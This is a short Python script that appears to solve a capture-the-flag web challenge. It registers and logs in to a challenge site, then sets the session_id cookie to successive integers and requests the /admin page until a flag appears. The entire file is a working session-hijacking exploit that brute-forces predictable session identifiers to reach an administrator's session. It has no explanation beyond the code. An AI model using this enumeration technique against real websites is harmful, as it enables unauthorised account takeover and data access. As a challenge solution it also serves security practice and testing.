#!/usr/bin/env python3
import requests
session = requests.Session()
url = "http://too-small-reminder.challs.olicyber.it/"
data = {"username": "usr123456", "password": ""}
session.post(url + "register", json=data)
session.post(url + "login", json=data)
i = 0
while True:
    session.cookies.set("session_id", str(i))
    req = session.get(url + "admin", cookies=session.cookies)
    print(i, session.cookies.get_dict(), req.text)
    if "flag{" in req.text:
        break
    i += 1
